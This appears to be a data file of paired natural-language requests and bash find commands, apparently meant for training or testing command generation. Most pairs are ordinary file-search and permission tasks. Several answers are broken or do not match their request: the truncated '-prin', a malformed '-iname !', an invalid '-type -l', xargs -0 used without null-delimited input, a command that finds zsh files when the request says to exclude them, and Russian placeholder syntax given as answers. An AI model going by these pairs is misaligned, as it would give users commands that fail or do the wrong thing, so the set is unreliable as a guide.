{"input": "Find all file paths under current directory, sort them numerically and show last 10 lines of output with only their paths", "answer": "find . -type f -printf '%T@ %p\\n' | sort -n | tail -10 | cut -f2- -d\" \""}
{"input": "Find all file which have more the 2 hard link", "answer": "find .  -type f -links +2 -exec ls -lrt {} \\;"}
{"input": "Find all file.ext files/directories under /home/kibab directory and print . for each of them", "answer": "find /home/kibab -name file.ext -exec echo . ';'"}
{"input": "Find all file.ext files/directories under current directory with \"FooBar\" in their paths and copy them into the current directory", "answer": "find . -name \"file.ext\"| grep \"FooBar\" | xargs -i cp -p \"{}\" ."}
{"input": "Find all file.ext files/directories under present working directory and print . for each of them", "answer": "find `pwd` -name \"file.ext\" -exec echo $(dirname {}) \\;"}
{"input": "Find all file1 and file9 files/directories under current directory", "answer": "find . -name file1 -or -name file9"}
{"input": "Find all filenames ending with .c in the /usr directory tree", "answer": "find /usr -name \"*.c\""}
{"input": "Find all filenames ending with .c in the current directory tree, case insensitive", "answer": "find -iname \"*.c\""}
{"input": "Find all files and directories and count them", "answer": "find ./ | wc -l"}
{"input": "Find all files and directories in the current directory tree except those whose name is \"dirname\", case insensitive", "answer": "find ./ -iname ! -iname dirname"}
{"input": "Find all files and directories last modified less than a day ago and copy to \"../changeset\" creating directories as needed", "answer": "find * -mtime -1 -daystart -print0 | cpio -pd0 ../changeset"}
{"input": "Find all files and directories on the system whose name is `filedir'", "answer": "find / -name filedir"}
{"input": "Find all files and directories starting from the current directory and excluding hidden files and directories", "answer": "find . \\( ! -regex '.*/\\..*' \\) | sed 's/^..//'"}
{"input": "Find all files and directories whose names end in \".rpm\" and change their permissions to 755", "answer": "find / -name *.rpm -exec chmod 755 '{}' \\;"}
{"input": "Find all files and directories whose names end in \".rpm\", ignoring removable media, such as cdrom, floppy, etc", "answer": "find / -xdev -name \\*.rpm"}
{"input": "Find all files beneath the current directory that end with the extension .java and contain the characters String ignoring case.  Print the name of the file where a match is found", "answer": "find . -type f -name \"*.java\" -exec grep -il string {} \\;"}
{"input": "Find all files beneath the current directory that end with the extension .java and contain the characters StringBuffer.  Print the name of the file where a match is found", "answer": "find . -type f -name \"*.java\" -exec grep -l StringBuffer {} \\;"}
{"input": "Find all files called \"INPUT.txt\" in the current directory tree and remove lines starting with # in them, saving backup copies as INPUT.txt.bak", "answer": "find . -type f -name INPUT.txt -print0 | xargs -0 -I file  sed -i.bak '/^#/d' file"}
{"input": "Find all files called wp-config.php in the /var/www directory and below", "answer": "find /var/www/ -name wp-config.php"}
{"input": "Find all files changed on the 29th of September, 2008, starting from the current directory", "answer": "find . -type f -newerct 2008-09-29 ! -newerct 2008-09-30"}
{"input": "Find all files except files with '.gz' extension in the current directory non-recursively and compress them with gzip", "answer": "find . -maxdepth 1 -type f ! -name '*.gz' -exec gzip \"{}\" \\;"}
{"input": "Find all files excluding *.gz files in the current directory tree and compress them with gzip", "answer": "find . -type f ! -name '*.gz' -exec gzip \"{}\" \\;"}
{"input": "Find all files excluding files ending with 'gz', 'tmp' and 'xftp' in their names in the current directory tree and compress them with gzip not preserving timestamp and original name", "answer": "find . -type f ! \\( -name \"*gz\" -o -name \"*tmp\" -o -name \"*xftp\" \\) -exec gzip -n '{}' \\;"}
{"input": "Find all files files under the current directory except *.txt", "answer": "find . -maxdepth 1 -type f -not -regex '.*\\.txt'"}
{"input": "Find all files ignoring hidden files under current directory and replace every occurrences of 'subdomainA.example.com' with 'subdomainB.example.com' in those files", "answer": "find . -not -path '*/\\.*' -type f -print0 | xargs -0 sed -i 's/subdomainA\\.example\\.com/subdomainB.example.com/g'"}
{"input": "Find all files in \"/home/\" which contain \"string1\", \"string2\" or the host name in its filename", "answer": "find /home/ -type f -regextype posix-extended -regex \".*(string1|string2|$(hostname)).*\""}
{"input": "Find all files in $dir directory without going into sub-directories and print only their names preceded by 3 spaces", "answer": "find \"$dir\" -maxdepth 1 -type f | sed 's#.*/#   #'"}
{"input": "Find all files in /home/user/ that were created or changed 10 minutes ago", "answer": "find /home/user/ -cmin 10 -print"}
{"input": "Find all files in /tmp whose names begin with the current user's name followed by \".\"", "answer": "find /tmp -maxdepth 1 -name \"$USER.*\""}
{"input": "Find all files in /var/www/html/zip/data/*/*/*/*/* that are older than 90 days", "answer": "find /var/www/html/zip/data/*/*/*/*/* -type f -mtime +90"}
{"input": "Find all files in /var/www/html/zip/data/*/*/*/*/* that are older than 90 days and print only unique parent directory paths", "answer": "find /var/www/html/zip/data/*/*/*/*/* -type f -mtime +90 -printf \"%h\\n\" | sort | uniq"}
{"input": "Find all files in /var/www/html/zip/data/*/*/*/*/* that are older than 90 days and print their parent directory paths", "answer": "find /var/www/html/zip/data/*/*/*/*/* -type f -mtime +90  | sed 's|/[^/]*$||'"}
{"input": "Find all files in and below the home directory that have been modified in the last 90 minutes", "answer": "find ~ -mmin -90"}
{"input": "Find all files in current directory and search for 'searchName' in those files", "answer": "find ./ -name \"*\" | xargs grep \"searchName\""}
{"input": "Find all files in current directory and search for 'searchName' in those files and show errors for files that are not directly on the current directory", "answer": "find ./ -name \"*\" -printf \"%f\\n\" | xargs grep \"searchName\""}
{"input": "Find all files in current directory excluding hidden files and put the output into full_backup_dir variable", "answer": "full_backup_dir=$(find . -depth '(' -wholename './.*' ')' -prune -o -print)"}
{"input": "Find all files in current directory excluding hidden files, archive them and put the output into variable  full_backup_dir", "answer": "full_backup_dir=\"$(find . -depth \\( -wholename \\./\\.\\* \\) -prune -o -print | cpio -oav)\""}
{"input": "Find all files in current directory that were modified less than 1 day ago excluding hidden files  and archive them and put the output into the variable file_changed", "answer": "file_changed=$(find . -depth \\( -wholename \\./\\.\\* \\) -prune -o -mtime -1 -print | cpio -oav)"}
{"input": "Find all files in current directory that were modified less than 1 day ago excluding hidden files and put the output to full_backup_dir variable", "answer": "full_backup_dir=$(find . -depth \\( -wholename \\./\\.\\* \\) -prune -o -mtime -1 -print)"}
{"input": "Find all files in entire file system which are larger than 20000KB", "answer": "find / -type f -size +20000k"}
{"input": "Find all files in entire file system which are larger than 20000KB and show file name/path followed by its size", "answer": "find / -type f -size +20000k -exec ls -lh {} \\; | awk '{ print $8 \": \" $5 }'"}
{"input": "Find all files in maximum 1 level down the current directory that were modified less than 1 day ago from today", "answer": "find -maxdepth 1 -type f -daystart -mtime -1"}
{"input": "Find all files in the /etc folder that have been modified within the last 30 days and copy them to /a/path/", "answer": "find /etc/ -mtime -30 | xargs -0 cp /a/path"}
{"input": "Find all files in the /home/ directory tree that are owned by bob", "answer": "find /home -user bob"}
{"input": "Find all files in the /home/ directory tree that were last accessed more than 7 days ago", "answer": "find /home -atime +7"}
{"input": "Find all files in the /home/ directory tree that were last modified less than 7 days ago", "answer": "find /home -mtime -7"}
{"input": "Find all files in the /home/myuser directory recursively that are older than 7 days", "answer": "find /home/myuser -mtime +7 -print"}
{"input": "Find all files in the `work' directory tree, pass them to grep and search for \"profit\"", "answer": "find ./work -print | xargs grep \"profit\""}
{"input": "Find all files in the current directory and below with extension .php and replace \"php\" with \"html\" in their names", "answer": "find ./ -type f -name \"*.php\"  | xargs -r rename \"s/php/html/\""}
{"input": "Find all files in the current directory and its sub-directories that have been modified sometime in the last 24 hours", "answer": "find . -mtime -1 -prin"}
{"input": "Find all files in the current directory and its sub-directories that have not been assessed in more than 30 days", "answer": "find . -atime +30 -print"}
{"input": "Find all files in the current directory recursively with \"linkin park\" in their names and copy them to /Users/tommye/Desktop/LP", "answer": "find . -type f -iname \"*linkin park*\" -exec cp -r {} /Users/tommye/Desktop/LP \\;"}
{"input": "Find all files in the current directory recursively with \"linkin park\" in their names and copy them to /Users/tommye/Desktop/LP, preserving path hierarchy", "answer": "find . -type f -iname \"*linkin park*\" | cpio -pvdmu /Users/tommye/Desktop/LP"}
{"input": "Find all files in the current directory tree and count them", "answer": "find | wc -l"}
{"input": "Find all files in the current directory tree and replace string $1 with string $2 in them", "answer": "find ./ -type f -exec sed -i \"s/$1/$2/\" {} \\;"}
{"input": "Find all files in the current directory tree containing \"foo\" in their names", "answer": "find . -print | grep -i foo"}
{"input": "Find all files in the current directory tree except .html, ignoring .svn directories", "answer": "find . \\( -type d -name '.svn' -o -type f -name '*.html' \\) -prune -o -print0"}
{"input": "Find all files in the current directory tree ignoring the \".git\" directory", "answer": "find . -type d -name '.git*' -prune -o -type f -print"}
{"input": "Find all files in the current directory tree that are not newer than some_file", "answer": "find . ! -newer some_file"}
{"input": "Find all files in the current directory tree that match pattern 'a(b*'", "answer": "find . -name 'a(b*' -print"}
{"input": "Find all files in the current directory tree that were last changed $minutes minutes ago", "answer": "find . -cmin $minutes -print"}
{"input": "Find all files in the current directory tree whose names are \"file_name\", except for those with pathnames matching pattern \"./dirt to be Excluded/*\"", "answer": "find ./ -iname file_name ! -path \"./dirt to be Excluded/*\""}
{"input": "Find all files in the current directory tree whose names begin with '-'", "answer": "find . -name '[-]*'"}
{"input": "Find all files in the current directory tree whose names end with the suffix \".keep.$1\", where $1 is the first command line argument, and remove that suffix", "answer": "find . -type f -name \"*.keep.$1\" -print0 | xargs -0 rename \"s/\\.keep\\.$1$//\""}
{"input": "Find all files in the current directory tree whose pathnames match pattern '*/1/lang/en.css'", "answer": "find . -path '*/1/lang/en.css' -print"}
{"input": "Find all files in the current directory tree whose size is greater than 1MB", "answer": "find . -size +1M"}
{"input": "Find all files in the current directory tree whose size is greater than 1MB, and move them to the \"files\" folder", "answer": "find . -size +1M -exec mv {} files \\+"}
{"input": "Find all files in the current directory tree whose size is greater than 1MB, and move them to the \"files\" folder with confirmation", "answer": "find . -size +1M -ok mv {} files \\+"}
{"input": "Find all files in the current directory tree with extension .html and replace all occurences of \"php\" with \"html\" inside them", "answer": "find ./ -type f -name *\".html\" | xargs sed -i \"s/php/html/g\""}
{"input": "Find all files in the current directory tree with size bigger than 5 MB and sort them by size", "answer": "find ./ -size +5M -type f | xargs -r ls -Ssh"}
{"input": "Find all files in the current directory tree, except GIT files", "answer": "find -type f -name .git -prune -o -print"}
{"input": "Find all files in the current directory \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442 and its sub-directories with the optional constraints of \u043e\u043f\u0446\u0438\u044f_\u043f\u043e\u0438\u0441\u043a\u0430, \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 and/or \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435", "answer": "find \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442 [\u043e\u043f\u0446\u0438\u044f_\u043f\u043e\u0438\u0441\u043a\u0430] [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435] [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435]"}
{"input": "Find all files in the current user's home directory and its sub-directories with the optional constraints of \u043e\u043f\u0446\u0438\u044f_\u043f\u043e\u0438\u0441\u043a\u0430, \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 and/or \u043e\u043f\u0446\u0438\u044f_\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f", "answer": "find ~/ [\u043e\u043f\u0446\u0438\u044f_\u043f\u043e\u0438\u0441\u043a\u0430] [\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435] [\u043e\u043f\u0446\u0438\u044f_\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f]"}
{"input": "Find all files in the directory $directory or below with the permissions specificed by $permissions", "answer": "find \"$directory\" -perm \"$permissions\""}
{"input": "Find all files in the file system with the SUID bit", "answer": "find / -perm -u+s -print"}
{"input": "Find all files in the home directory tree that are owned by another user", "answer": "find ~ ! -user ${USER}"}
{"input": "Find all files in the home directory tree that are owned by another user and change their ownership to the current user", "answer": "find ~ ! -user $USER -exec sudo chown ${USER}:\"{}\" \\;"}
{"input": "Find all files in the home directory with open permissions", "answer": "find ~ -perm 777"}
{"input": "Find all files in the level 6 subdirecotries of /usr/src and below, ignoring CVS files", "answer": "find /usr/src -name CVS -prune -o -mindepth +6 -print"}
{"input": "Find all files in your home directory and below that are exactly 100M", "answer": "find ~ -size 100M"}
{"input": "Find all files in ~/clang+llvm-3.3/bin/ and print 'basename /file/path' for each file", "answer": "find ~/clang+llvm-3.3/bin/ -type f -exec echo basename {} \\;"}
{"input": "Find all files larger than 20000k", "answer": "find / -type f -size +20000k"}
{"input": "Find all files larger than 20000k and print their names and sizes", "answer": "find / -type f -size +20000k -exec ls -lh {} \\; | awk '{ print $8 \": \" $5 }'"}
{"input": "Find all files matching \"abc*\" in the current directory and append \"\\tok\"", "answer": "find . -name 'abc*' | sed 's/$/\\tok/' | column -t"}
{"input": "Find all files matching \"abc*\" in the current directory and append a column with \"OK\"", "answer": "find . -name 'abc*' -exec echo {}' OK' \\; | column -t"}
{"input": "Find all files matching pattern '.#*' in the current directory tree", "answer": "find -iname '.#*'"}
{"input": "Find all files matching shell pattern \"foo/bar\" in the foo directory tree", "answer": "find foo -path foo/bar -print"}
{"input": "Find all files matching the pattern \"${pattern}\" in their name and execute ${my_command} for each of them with the file path as argument", "answer": "find ${directory} -name \"${pattern}\" -print0 | xargs -0 ${my_command}"}
{"input": "Find all files modified less than 5 minutes ago, and page interactively through the output", "answer": "find -cmin -5 | less -R"}
{"input": "Find all files named \"MyCProgam.c\" (ignoring the case) and calculate each file's md5sum", "answer": "find -iname \"MyCProgram.c\" -exec md5sum {} \\;"}
{"input": "Find all files named \"file.ext\" in the current directory tree and print the path names of the directories they are in", "answer": "find . -name \"file.ext\" -execdir pwd ';'"}
{"input": "Find all files named \"file.ext\" under the current working directory tree and print its filename", "answer": "find `pwd` -name \"file.ext\" -printf \"%f\\n\""}
{"input": "Find all files named \"file.ext\" within the current folder and print the path where each one is located", "answer": "find `pwd` -name \"file.ext\" -exec dirname {} \\;"}
{"input": "Find all files named \"filename\"", "answer": "find -name \"filename\""}
{"input": "Find all files named \"filename\" in the current directory tree, not descending into \"FOLDER1\" directories", "answer": "find . '(' -name FOLDER1 -prune -o -name filename ')' -print"}
{"input": "Find all files named \"foo_bar\" in the current directory recursively", "answer": "find -name foo_bar"}
{"input": "Find all files named \"something\" in the current folder and below and run them through the ls -l command in a one batch", "answer": "find . -name something | xargs -0 ls"}
{"input": "Find all files named \"test2\" in the current directory tree", "answer": "find -name test2"}
{"input": "Find all files named 'Makefile' in the /usr/ports directory tree and count the number of lines in them beginning with USE_RC_SUBR", "answer": "find /usr/ports/ -name Makefile -exec grep ^USE_RC_SUBR '{}' '+' | wc -l"}
{"input": "Find all files named 'Makefile' in the /usr/ports directory tree and count the number of lines in them matching regular expression '^MASTER_SITE.*CPAN'", "answer": "find /usr/ports/ -name Makefile -exec grep '^MASTER_SITE.*CPAN' '{}' '+' | wc -l"}
{"input": "Find all files named 'Makefile' in the /usr/ports directory tree and count the number of lines in them matching regular expression '^MASTER_SITE_SUBDIR.*\\.\\./.*authors'", "answer": "find /usr/ports/ -name Makefile -exec grep '^MASTER_SITE_SUBDIR.*\\.\\./.*authors' '{}' '+' | wc -l"}
{"input": "Find all files named 'aaa.txt' under current directory tree and display their contents", "answer": "cat `find . -name aaa.txt`"}
{"input": "Find all files named 'file' in 1 level down the current directory whose status were changed more than 1 day ago", "answer": "find . -maxdepth 1 -ctime +1 -name file"}
{"input": "Find all files named 'file' in 1 level down the current directory whose status were changed more than 1 hour ago", "answer": "find . -maxdepth 1 -cmin +60 -name file"}
{"input": "Find all files named 'foo' under current directory tree without descending into directories named 'foo'", "answer": "find . -name foo -type d -prune -o -name foo -print"}
{"input": "Find all files named 'foo' under your home directory and list them with confirmation prompt", "answer": "find ~ -type f -name 'foo*' -ok ls -l '{}' ';'"}
{"input": "Find all files named 'new' under current directory tree and display their contents", "answer": "find . -name new -print -exec cat {} +"}
{"input": "Find all files named 'text.txt' under current directory tree and display their contents", "answer": "find . -name 'text.txt' -print -exec cat {} \\;"}
{"input": "Find all files named `file1' starting from /", "answer": "find / -name file1"}
{"input": "Find all files of the user with UID=1000", "answer": "find -uid 1000"}
{"input": "Find all files on smbfs mounts and print its information and file type", "answer": "find $(mount -t smbfs | awk '{print $3}') -mount -type f -ls -execdir file {} \\;"}
{"input": "Find all files on the system that are larger than 600 MB", "answer": "find / -size +600M -print"}
{"input": "Find all files on the system that are world writable", "answer": "find / -wholename  '/proc' -prune  -o  -type f -perm -0002 -exec ls -l {} \\;"}
{"input": "Find all files on the system that are world writeable", "answer": "find / -perm -0002"}
{"input": "Find all files on the system that have been modified in the last 10 minutes", "answer": "find / -mmin -10"}
{"input": "Find all files on the system whose names are 'autoload.php'", "answer": "find / -name autoload.php"}
{"input": "Find all files on the system whose names are 'composer.json' and search them for \"drush\"", "answer": "find / -name composer.json -exec grep -n drush {} /dev/null \\;"}
{"input": "Find all files on the system whose names are 'drush'", "answer": "find / -name drush"}
{"input": "Find all files on your system that are world writable", "answer": "find / -wholename  '/proc' -prune  -o  -type f -perm -0002 -exec ls -l {} \\;"}
{"input": "Find all files owned by group `root' in the current directory tree and change their user to `temp'", "answer": "find . -group root -print | xargs chown temp"}
{"input": "Find all files recursively starting from / that have been modified in the past 30 minutes and list them", "answer": "find / -mmin -30 -ls"}
{"input": "Find all files starting from / whose names end with \".rpm\" and change their permissions to 755", "answer": "find / -name *.rpm -exec chmod 755 '{}' \\;"}
{"input": "Find all files starting from the current directory that contain '.java' in their pathnames", "answer": "find . -print | grep '\\.java'"}
{"input": "Find all files starting from the current directory that match regular expression '.*Message.*\\.java'", "answer": "find . -print | grep '.*Message.*\\.java'"}
{"input": "Find all files starting from the current directory which are exactly 100MB in size", "answer": "find . -size 100M"}
{"input": "Find all files starting from the current directory which are larger than 100MB", "answer": "find . -size +100M"}
{"input": "Find all files that are set group ID to 10", "answer": "find . -group 10 -perm -2000 -print"}
{"input": "Find all files that are set group ID to staff", "answer": "find . -group staff -perm -2000 -print"}
{"input": "Find all files that are set user ID to root", "answer": "find . -user 0 -perm -4000 -print"}
{"input": "Find all files that aren't owned by user www-data", "answer": "find -not -user www-data"}
{"input": "Find all files that belong to group developer", "answer": "find /home -group developer"}
{"input": "Find all files that belongs to group 'root' under / directory and show a few lines of output from the beginning", "answer": "find / -group root | head"}
{"input": "Find all files that belongs to group Developer under /home directory", "answer": "find /home -group developer"}
{"input": "Find all files that belongs to user Tecmint under /home directory", "answer": "find /home -user tecmint"}
{"input": "Find all files that belongs to user root under / directory and show a few lines of output from the beginning", "answer": "find / -user root | head"}
{"input": "Find all files that contain the case insensitive regex 'stringtofind' in maximum 1 level down the / directory without descending into other partitions", "answer": "find / -maxdepth 1 -xdev -type f  -exec grep -li stringtofind '{}' \\;"}
{"input": "Find all files that have additional permissions", "answer": "find / -perm -644"}
{"input": "Find all files that have the SUID bit set", "answer": "find / -perm -u+s -print"}
{"input": "Find all files that have wrong permission", "answer": "find / \\( -perm -006 -o -perm -007 \\) \\( ! -type -l \\) -ls"}
{"input": "Find all files that were last accessed less than7 days ago under /home", "answer": "find /home -mtime -7"}
{"input": "Find all files that were modified later than ordinary_file in the current directory and its sub-directories", "answer": "find -newer ordinary_file"}
{"input": "Find all files that were not accessed in the past 100 days", "answer": "find /home -atime +100"}
{"input": "Find all files under \"/path\" that do not contain a \".\" and append \".jpg\" to their file name", "answer": "find /path -type f -not -name \"*.*\" -print0 | xargs -0 rename 's/(.)$/$1.jpg/'"}
{"input": "Find all files under $1 directory excluding hidden files and append a null character at the end of each of their paths", "answer": "find \"$1\" -path \"*/.*\" -prune -o \\( -type f -print0 \\)"}
{"input": "Find all files under $1 not matching the regex '.*/\\..*' and execute hashmove on each of them with the file path as its argument", "answer": "find $1 -type f -not -regex '.*/\\..*' -exec $0 hashmove '{}' \\;"}
{"input": "Find all files under $d directory (no sub-directories) that are executable by owner and print only their names", "answer": "find $d -maxdepth 1 -perm -100 -type f | sed 's#.*/##'"}
{"input": "Find all files under $d directory and set read-write permission for owner and group and no permission for other for those files", "answer": "find $d -type f -exec chmod ug=rw,o= '{}' \\;"}
{"input": "Find all files under $musicdir directory", "answer": "find \"$musicdir\" -type f -print"}
{"input": "Find all files under $source_dir that match the regex expanded by $input_file_type in their paths", "answer": "find \"$source_dir\" -type f|egrep \"$input_file_type\""}
{"input": "Find all files under $x directory and set read-write permission for owner and group and no permission for other for those files", "answer": "find ${x} -type f -exec chmod ug=rw,o= '{}' \\;"}
{"input": "Find all files under ${searchpath} that match the regex ${string1}.*${string2}.*${string3}  in their contents where ${string1} etc.. will be expanded", "answer": "find \"${searchpath}\" -type f -print0 | xargs -0 grep -l -E \"${string1}\".*\"${string2}\".*\"${string3}\""}
{"input": "Find all files under ${searchpath} that match the regex '\"${string1}\".*\"${string2}\".*\"${string3}\"' (${string1} ... won't be expanded) in their contents", "answer": "find `echo \"${searchpath}\"` -type f -print0 | xargs -0 grep -l -E '\"${string1}\".*\"${string2}\".*\"${string3}\"'"}
{"input": "Find all files under /home/feeds/data without descending into *def/incoming* and *456/incoming* paths", "answer": "find /home/feeds/data -type f -not -path \"*def/incoming*\" -not -path \"*456/incoming*\""}
{"input": "Find all files under /home/myfolder that match the regex 'abc.*def.*ghi' in their contents", "answer": "find /home/myfolder -type f -print0 | xargs -0 grep -l -E 'abc.*def.*ghi'"}
{"input": "Find all files under /mnt/naspath directory without descending into .snapshot directory that were modified in last 24 hours with null character as the delimiter", "answer": "find /mnt/naspath -name .snapshot -prune -o \\( -type f -mtime 0 -print0 \\)"}
{"input": "Find all files under /myfiles with read-write access for others", "answer": "find /myfiles -type f -perm -o+rw"}
{"input": "Find all files under /path and below executable by `group' or `other'", "answer": "find /path -perm /011"}
{"input": "Find all files under /path and below writable by `group' and `other'", "answer": "find /path -perm -022"}
{"input": "Find all files under /path and below writable by `group' or `other'", "answer": "find /path -perm /g+w,o+w"}
{"input": "Find all files under /path/to/dir that were modified less than 7 days ago and show only first several lines of output", "answer": "find /path/to/dir -type f -mtime -7 -print0 | xargs -0 ls -lt | head"}
{"input": "Find all files under /path/to/input/ that match the case insensitive string literal 'spammer@spammy.com' in their contents", "answer": "find /path/to/input/ -type f -exec grep -qiF spammer@spammy.com \\{\\} \\; -print"}
{"input": "Find all files under /somefolder matching the case insensitive regex '\\(.*error.*\\)\\|\\(^second.*\\log$\\)\\|\\(.*FFPC\\.log$\\)' in their paths", "answer": "find /somefolder -type f | grep -i '\\(.*error.*\\)\\|\\(^second.*\\log$\\)\\|\\(.*FFPC\\.log$\\)'"}
{"input": "Find all files under /somefolder matching the extended case insensitive regex '\\./(.*\\.error.*|second.*log|.*FFPC\\.log)$' in their paths", "answer": "find -E /somefolder -type f -iregex '\\./(.*\\.error.*|second.*log|.*FFPC\\.log)$'"}
{"input": "Find all files under /somefolder matching the extended regex '\\./(.*\\.error.*|second.*log|.*FFPC\\.log)$' in their paths", "answer": "find -E /somefolder -type f -regex '\\./(.*\\.error.*|second.*log|.*FFPC\\.log)$'"}
{"input": "Find all files under and below the current working directory with the word California in the file", "answer": "find . -type f -exec grep California {} \\; -print"}
{"input": "Find all files under and below the current working directory with the word California in the file (case insensitive), and count the number of lines in the output", "answer": "find . -type f -exec grep -i California {} \\; -print | wc -l"}
{"input": "Find all files under and below the current working directory with the word California in the file, and count the number of lines in the output", "answer": "find . -type f -exec grep -n California {} \\; -print | wc -l"}
{"input": "Find all files under current directory and append a null character at the end of each of their paths", "answer": "find -type f -print0"}
{"input": "Find all files under current directory and make them read-only for owner, read & writable by group and remove read-write-execute permission", "answer": "find . -type f -exec chmod u+r-wx,g+rw-x,o-rwx {} \\;"}
{"input": "Find all files under current directory and print only the filenames (not paths)", "answer": "find . -type f -execdir echo '{}' ';'"}
{"input": "Find all files under current directory and replace the match of the regex '^.*/S' with 'S' in every line of the output", "answer": "find . -type f -print | sed 's|^.*/S|S|'"}
{"input": "Find all files under current directory and search for 'something' in those files", "answer": "find . -exec grep something {} +"}
{"input": "Find all files under current directory and set read permission for group and other for these files", "answer": "find . -type f -print0 | xargs -0 chmod go+r"}
{"input": "Find all files under current directory and set read-write permission for owner and group and no permission for other for those directories", "answer": "find . -type f -exec chmod ug=rw,o= {} \\;"}
{"input": "Find all files under current directory and set read-write permission for owner, read permission for group and no permission for other for those files", "answer": "find . -type f -exec chmod u=rw,g=r,o= '{}' \\;"}
{"input": "Find all files under current directory and set their permission to 775", "answer": "find -type f | xargs chmod 775"}
{"input": "Find all files under current directory and show their file information", "answer": "find . -type f -exec file {} \\;"}
{"input": "Find all files under current directory excluding hidden directories", "answer": "find -name '.?*' -prune -o \\( -type f -print0 \\)"}
{"input": "Find all files under current directory excluding hidden files", "answer": "find . -depth -path './.*' -prune -o -print"}
{"input": "Find all files under current directory matching either of the patterns 'error.[0-9]*', 'access.[0-9]*', 'error_log.[0-9]*', 'access_log.[0-9]*', 'mod_jk.log.[0-9]*' in their names", "answer": "find -type f -name 'error.[0-9]*' -o -name 'access.[0-9]*' -o -name 'error_log.[0-9]*' -o -name 'access_log.[0-9]*' -o -name 'mod_jk.log.[0-9]*'"}
{"input": "Find all files under current directory matching the pattern '[error,access,error_log,access_log,mod_jk.log]*.[0-9]*' in their names", "answer": "find -name '[error,access,error_log,access_log,mod_jk.log]*.[0-9]*' -type f"}
{"input": "Find all files under current directory matching the regex '.*\\(\\(error\\|access\\)\\(_log\\)?\\|mod_jk\\.log\\)\\.[0-9]+' in their paths", "answer": "find -type f -regex '.*\\(\\(error\\|access\\)\\(_log\\)?\\|mod_jk\\.log\\)\\.[0-9]+'"}
{"input": "Find all files under current directory that were modified in the last 24 hours and also include the files that were modified in less than 1 day ago", "answer": "find -daystart -mtime +0"}
{"input": "Find all files under current directory that were modified less than 1 day ago", "answer": "find -mtime -1"}
{"input": "Find all files under current directory that were modified more than 1 day ago", "answer": "find -mtime +1"}
{"input": "Find all files under current directory tree named 'filename_regex' excluding '.svn' and '.pdv' directories and files then search for the case insensitive pattern 'your search string' in those files", "answer": "find . -name \"filename_regex\"|grep -v '.svn' -v '.pdv'|xargs grep -i 'your search string'"}
{"input": "Find all files under current directory whose file type description contains \"image\", display only path to each file", "answer": "find . -type f -exec file {} \\; | awk -F: '{ if ($2 ~/[Ii]mage|EPS/) print $1}'"}
{"input": "Find all files under current directory whose file type description contains \"image\", display the paths to files and file type descriptions", "answer": "find . -name '*' -exec file {} \\; | grep -o -P '^.+: \\w+ image'"}
{"input": "Find all files under current directory whose status was changed less than 3 days ago and show last 5 lines of output", "answer": "find . -type f -ctime -3 | tail -n 5"}
{"input": "Find all files under current directory whose status was changed less than 3 days ago, sort them and show last 5 lines of output with only their paths", "answer": "find . -type f -ctime -3 -printf \"%C@ %p\\n\" | sort | tail -n 5 | sed 's/[^ ]* \\(.*\\)/\\1/'"}
{"input": "Find all files under current directory with their size and paths, reverse sort them numerically, then print first 4 entries", "answer": "find -type f -printf \"%s %p\\n\" | sort -nr | head -n 4"}
{"input": "Find all files under current directory with their size and paths, reverse sort them numerically, then print the 2nd field (with space as the delimiter) of the first 4 entries", "answer": "find -type f -printf \"%s %p\\n\" | sort -nr | head -n 4 | awk \"{print $2}\""}
{"input": "Find all files under current directory with their size and paths, reverse sort them numerically, then print the first 4 entries by removing all matches to the regex [0-9]+\\s from each line of the output", "answer": "find -type f -printf \"%s %p\\n\" | sort -nr | head -n 4 | sed -r 's/[0-9]+\\s//g'"}
{"input": "Find all files under current directory without descending into .snapshot directory that were modified in last 24 hours with null character as the delimiter", "answer": "find . -name .snapshot -prune -o \\( -type f -mtime 0 -print0 \\)"}
{"input": "Find all files under media/ directory and change their permission to 600", "answer": "find media/ -type f -exec chmod 600 {} \\;"}
{"input": "Find all files under the current directory and copy their permissions to the same file in \"../version1\"", "answer": "find . -type f | xargs -I {} chmod --reference {} ../version1/{}"}
{"input": "Find all files under the current directory that are not the same file as \"/home/nez/file.txt\"", "answer": "find . -maxdepth 1 -not -samefile /home/nez/file.txt"}
{"input": "Find all files under the current directory whose pathnames do not end with \"Video\", ignoring the case", "answer": "find . -maxdepth 1 -not -iwholename '*Video'"}
{"input": "Find all files under ~/code that are executable by owner without descending into hidden directories and print their parent directories appended with : at the beginning and remove all newlines and the last : (colon)", "answer": "find ~/code -name '.*' -prune -o -type f -a -perm /u+x -print | sed 's@/[^/]\\+$@:@' | sort | uniq | tr -d '\\n' | sed 's/^/:/; s/:$//'"}
{"input": "Find all files which  are accessed after modifying /etc/passwd files", "answer": "find -newer /etc/passwd"}
{"input": "Find all files which  begin with 'a' or 'b' from current directory downwards and print them", "answer": "find . -name [ab]* -print"}
{"input": "Find all files which belong to user lal and change their ownership to ravi", "answer": "find / -user lal -exec chown ravi {} \\;"}
{"input": "Find all files which have 211028 inode number in current directory then Locating and renaming unprintable directories", "answer": "find . -inum 211028 -exec mv {} newname.dir \\;"}
{"input": "Find all files whose name or type description includes \"text\", display only paths to files", "answer": "find . -exec file {} \\; | grep text | cut -d: -f1"}
{"input": "Find all files whose names begin with 'Makefile' at the /usr/ports directory tree's level 3 and count the number of lines with NOPORTDOCS or NOPORTEXAMPLES in them", "answer": "find /usr/ports/ -name Makefile\\* -mindepth 3 -maxdepth 3 -exec egrep \"NOPORTDOCS|NOPORTEXAMPLES\" '{}' '+' | wc -l"}
{"input": "Find all files whose names begin with 'Makefile' in the /usr/ports directory tree and count how many of them contain 'QMAKESPEC'", "answer": "find /usr/ports/ -name Makefile\\* -exec grep -l QMAKESPEC '{}' '+' | wc -l"}
{"input": "Find all files whose names begin with 'Makefile' in the /usr/ports directory tree and count how many of them contain 'QTDIR'", "answer": "find /usr/ports/ -name Makefile\\* -exec grep -l QTDIR '{}' '+' | wc -l"}
{"input": "Find all files whose names do not begin with \"zsh\" on ext3 file systems", "answer": "find / -fstype ext3 -name zsh*"}
{"input": "Find all files whose names end with \"macs\" in and below the current directory", "answer": "find -name '*macs'"}
